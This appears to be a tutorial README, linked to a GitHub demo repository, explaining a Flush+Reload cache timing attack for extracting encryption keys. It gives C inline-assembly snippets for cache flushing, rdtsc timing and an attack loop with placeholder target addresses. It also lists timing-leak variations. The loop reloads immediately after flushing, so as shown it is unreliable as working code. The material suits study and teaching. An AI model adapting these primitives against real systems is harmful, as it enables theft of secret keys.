To demonstrate a malicious app that performs a timing attack to extract encryption keys, such as the one used by applications to encrypt storage, you would need to show how the app can flush the CPU cache and measure the timing of secret-dependent operations with sufficient precision. Below is a conceptual overview of how such an attack might be constructed and demonstrated:

# Overview of the Attack
Flush+Reload Timing Attack: This attack leverages the CPU cache to infer information about secret-dependent operations by measuring the time it takes to access data.

### Prerequisites:
- [x] Ability to run unprivileged code on the target device.
- [x] High-precision timers to measure cache access times.
- [x] Knowledge of where in memory the secrets or secret-dependent operations are likely to be.

## Steps to Construct the Attack
1. Setting Up the Environment
Install Necessary Tools: You'll need tools for monitoring and manipulating the CPU cache and measuring time with high precision.

### Install necessary packages
<pre>
apt-get install build-essential perf
</pre>

2. Flush the CPU Cache
Use clflush instruction to flush the CPU cache. This instruction is usually available through inline assembly or specific libraries.

<pre>
void flush_cache(void *addr) {
    asm volatile("clflush (%0)" :: "r"(addr));
}
</pre>

3. Measure Access Time
Use high-precision timers to measure the time it takes to access data.

<pre>
uint64_t measure_access_time(void *addr) {
    uint64_t start, end;
    asm volatile("mfence\n\t"
                 "rdtsc\n\t"
                 "lfence\n\t"
                 "mov %%rax, %0\n\t"
                 : "=r" (start)
                 :
                 : "%rax", "%rdx");
    asm volatile("mov (%0), %%rax\n\t" :: "r"(addr) : "rax");
    asm volatile("mfence\n\t"
                 "rdtsc\n\t"
                 "lfence\n\t"
                 "mov %%rax, %0\n\t"
                 : "=r" (end)
                 :
                 : "%rax", "%rdx");
    return end - start;
}
</pre>

4. Identify Secret-Dependent Operations
Identify the memory addresses of secret-dependent operations. This requires understanding the target application's behavior and memory layout.

5. Conduct the Timing Attack
Repeatedly flush the cache and measure the access times to infer the secret. This involves statistical analysis to distinguish between cache hits and misses.

<pre>
void perform_attack() {
    void *target_addr = /* address of the secret-dependent operation */;
    while (1) {
        flush_cache(target_addr);
        uint64_t time = measure_access_time(target_addr);
        if (time < THRESHOLD) {
            // Cache hit, likely secret access
            // Collect timing data and analyze
        } else {
            // Cache miss
        }
    }
}
</pre>

# Timing Attack Variations
Timing attacks on loading or processing secrets can be introduced in various ways. The delay may be caused by:

- [x] :zap: Function Calls: Delays introduced by calling different functions for correct or incorrect characters or operations[^1].
- [x] :zap: Conditional Branching: Conditional branches may introduce different timing behavior based on the data being processed[^2].
- [x] :zap: Differences in Processing Under Different Conditions: Different processing paths or states may cause the system to exhibit varying delays depending on the condition being met (e.g., whether the secret is correctly guessed or not)[^3].


[^1]: [demo_delay_by_call_function.py](https://github.com/ursa-mikail/demo_timing_attack/blob/main/demo_delay_by_call_function.py)  
  Delays introduced by calling different functions.
[^2]: [demo_delay_by_conditional_branching.py](https://github.com/ursa-mikail/demo_timing_attack/blob/main/demo_delay_by_conditional_branching.py)  
  Delays introduced by conditional branching.
[^3]: [demo_delay_by_process_condition_breaking.py](https://github.com/ursa-mikail/demo_timing_attack/blob/main/demo_delay_by_process_condition_breaking.py)  
  Delays introduced by different processes or instructions.


